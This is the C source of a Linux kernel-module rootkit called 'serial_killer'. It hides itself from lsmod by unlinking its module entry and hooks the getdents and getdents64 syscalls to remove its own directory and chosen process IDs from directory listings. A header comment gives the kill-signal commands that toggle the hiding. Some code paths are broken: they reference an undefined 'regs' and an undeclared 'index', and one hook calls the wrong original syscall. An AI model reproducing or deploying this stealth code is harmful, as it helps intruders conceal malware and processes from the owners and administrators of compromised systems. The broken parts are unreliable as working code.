#include <linux/syscalls.h>
#include <linux/kernel.h>
#include <linux/namei.h>
#include <linux/types.h>
#include <linux/dirent.h>
#include <linux/module.h>
#include <linux/string.h>
#include "../utils/version_handler.h"

/* DESCRIPTION
* Handles the presence of this rootkit - Hides from lsmod and ls
*
* Hide Presence: kill -61 0
* Show Presence: kill -61 1
*/

/* GLOBAL VARIABLES */
#define MAX_CHAR 6 
struct hidden_process_list_node{
    char s_pid[MAX_CHAR];
    struct hidden_process_list_node *next;
};
struct hidden_process_list_node *head, *tail;
int hidden_process_list_len = 0;
struct list_head *previous_module;
char *hidden_directories[] = {"serial_killer"};


/**********************************/

/* FUNCTION PROTOTYPES */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static asmlinkage int hook_getdents64(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents)(const struct pt_regs *regs);
static asmlinkage int hook_getdents(const struct pt_regs *regs);

#else
static asmlinkage long (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count);
static asmlinkage long (*orig_getdents)(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count);
#endif

void show_lsmod(void);
void hide_lsmod(void);
void add_hidden_process(pid_t pid);
void remove_hidden_process(pid_t pid);
int check_for_duplicate_pid(char *s_pid);
void free_hidden_processes(void);
void printk_hidden_processes(void);
/******************************************************************************************************************/

void show_lsmod(void) {
    list_add(&THIS_MODULE->list, previous_module);
    return;
}

void hide_lsmod(void) {
    previous_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    return;
}

void add_hidden_process(pid_t pid) {
    char s_pid[MAX_CHAR];
    if (pid < 0 || pid > 99999) {
        printk(KERN_ERR "serial_killer: Invalid PID!");
        return;
    }
    sprintf(s_pid, "%d", pid);
    if (check_for_duplicate_pid(s_pid)) {
        return;
    }
    //printk(KERN_DEBUG "value of original s_pid - %s", s_pid);
    struct hidden_process_list_node *new_proc;
    new_proc = kzalloc(sizeof(struct hidden_process_list_node), GFP_KERNEL);
    strncpy(new_proc->s_pid, s_pid, MAX_CHAR);
    new_proc->next = NULL;
    if (hidden_process_list_len == 0) {
        head = new_proc;   
        tail = head;
    } else {
        tail->next = new_proc;
        tail = new_proc;
    }
    hidden_process_list_len += 1;
    return;
}

void remove_hidden_process(pid_t pid) {
    char s_pid[MAX_CHAR];
    if (pid < 0 || pid > 99999) {
        printk(KERN_ERR "serial_killer: Invalid PID!");
        return;
    }
    sprintf(s_pid, "%d", pid);
    struct hidden_process_list_node *curr = head;
    struct hidden_process_list_node *prev = curr;
    while (curr != NULL) {
        if ((memcmp(curr->s_pid, s_pid, MAX_CHAR) == 0)){
            if(curr == head) {
                head = curr->next;
            } else if (curr != head || curr != tail){
                prev->next = curr->next;
            } else if (curr == tail) {
                prev->next = NULL;
                tail = prev;
            }
            kfree(curr);
            hidden_process_list_len--;
            return;
        }
        prev = curr;
        curr = curr->next;
    }
    return;
}

int check_for_duplicate_pid(char *s_pid) {
    struct hidden_process_list_node *curr = head;
    while (curr != NULL) {
        if (memcmp(curr->s_pid, s_pid, MAX_CHAR) == 0) {
            printk(KERN_ERR "serial_killer: Found duplicate PID - %s\n", curr->s_pid);
            return 1;
        }
        curr = curr->next;
    }
    return 0;
}

void free_hidden_processes(void){
    struct hidden_process_list_node *curr = head;
    while (curr != NULL) {
        // Move the head to the next node before freeing the current.
        head = curr->next;
        kfree(curr);
        curr = head;
    }
    hidden_process_list_len = 0;
    return;
}
void printk_hidden_processes(void){
    struct hidden_process_list_node *curr = head;
    printk(KERN_DEBUG "serial_killer: hidden process linked list -  ");
    while (curr != NULL) {
        printk(KERN_CONT "%s ", curr->s_pid);
        curr = curr->next;
    } 
    printk(KERN_CONT "\n");
    return;
}

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage int hook_getdents64(const struct pt_regs *regs){

    int err;
    int index;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Get the arguments passed to sys_getdents64 */
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL){
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err) {
        goto done;
    }

    /* Iterate through the array of directories to hide */
    index = 0;
    while (index < ARRAY_SIZE(hidden_directories)) {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret) {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if (memcmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0) {
                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker) {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        index++;
        offset = 0;
    }

    struct hidden_process_list_node *curr_proc = head;
    while (curr_proc != NULL) {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret) {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if ((memcmp(curr_proc->s_pid, current_dir->d_name, MAX_CHAR) == 0) 
            && (strncmp(curr_proc->s_pid, "", MAX_CHAR) != 0)) {
                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker) {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        curr_proc = curr_proc->next;
        offset = 0;
    }
    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err) {
        goto done;
    }

done:    
    kfree(dirent_ker);
    return ret;
} 

static asmlinkage int hook_getdents(const struct pt_regs *regs){

    const struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    int err;
    int index;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Get the arguments passed to sys_getdents64 */
    struct linux_dirent __user *dirent = (struct linux_dirent *)regs->si;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL){
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err) {
        goto done;
    }

    /* Iterate through the array of directories to hide */
    index = 0;
    while (index < ARRAY_SIZE(hidden_directories)) {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret) {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if (memcmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0) {
                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker) {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        index++;
        offset = 0;
    }

    struct hidden_process_list_node *curr_proc = head;
    while (curr_proc != NULL) {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret) {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if ((memcmp(curr_proc->s_pid, current_dir->d_name, MAX_CHAR) == 0) 
            && (strncmp(curr_proc->s_pid, "", MAX_CHAR) != 0)) {
                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker) {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        curr_proc = curr_proc->next;
        offset = 0;
    }
    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err) {
        goto done;
    }

done:    
    kfree(dirent_ker);
    return ret;
}

#else
static asmlinkage int hook_getdents64(unsigned int fd, struct linux_dirent64 *dirent, unsigned int count){
    
    int err;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL){
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err) {
        goto done;
    }

    /* Iterate through the array of directories to hide */
    index = 0;
    while (index < ARRAY_SIZE(hidden_directories)) {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret) {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if (memcmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0) {
                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker) {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        index++;
        offset = 0;
    }

    struct hidden_process_list_node *curr_proc = head;
    while (curr_proc != NULL) {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret) {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if ((memcmp(curr_proc->s_pid, current_dir->d_name, MAX_CHAR) == 0) 
            && (strncmp(curr_proc->s_pid, "", MAX_CHAR) != 0)) {
                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker) {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        curr_proc = curr_proc->next;
        offset = 0;
    }
    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err) {
        goto done;
    }

done:    
    kfree(dirent_ker);
    return ret;

}

static asmlinkage int hook_getdents(unsigned int fd, struct linux_dirent *dirent, unsigned int count){
    
    const struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    int err;

    /* Intermediate structures for looping through the directory listing*/
    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    unsigned long offset = 0;

    /* Calling orig_getdents64 to get the total record length of the listing*/
    int ret = orig_getdents64(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if (ret <= 0 || dirent_ker == NULL){
        goto done;
    }

    /* Copy the argument 'dirent' passed to sys_getdents64 from userspace to kernel space*/
    err = copy_from_user(dirent_ker, dirent, ret);
    if (err) {
        goto done;
    }

    /* Iterate through the array of directories to hide */
    index = 0;
    while (index < ARRAY_SIZE(hidden_directories)) {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret) {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if (memcmp(hidden_directories[index], current_dir->d_name, strlen(hidden_directories[index])) == 0) {
                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker) {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        index++;
        offset = 0;
    }

    struct hidden_process_list_node *curr_proc = head;
    while (curr_proc != NULL) {
        /* Iterate over offset, incrementing by current_dir->d_reclen each loop*/
        while (offset < ret) {
            /* First iteration looks at dirent_ker + 0, which is the */
            current_dir = (void *)dirent_ker + offset;
            /* Compare current_dir->d_name to our string*/
            if ((memcmp(curr_proc->s_pid, current_dir->d_name, MAX_CHAR) == 0) 
            && (strncmp(curr_proc->s_pid, "", MAX_CHAR) != 0)) {
                //printk(KERN_DEBUG "serial_killer: %s - %d\n", current_dir->d_name,current_dir->d_reclen);
                /* If string is contained in the first struct in the list, then we shift everything else up by it's size */
                if (current_dir == dirent_ker) {
                    ret -= current_dir->d_reclen;
                    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                    continue;
                }
                /* For our directory to be hidden, we update the value of previous_dir->d_reclen*/
                previous_dir->d_reclen += current_dir->d_reclen;
            } else {
                previous_dir = current_dir;
            }
            offset += current_dir->d_reclen;
        }
        curr_proc = curr_proc->next;
        offset = 0;
    }
    /* Copy our altered dirent structure back to userspace so it can be returned.*/
    err = copy_to_user(dirent, dirent_ker, ret);
    if (err) {
        goto done;
    }

done:    
    kfree(dirent_ker);
    return ret;
}

#endif


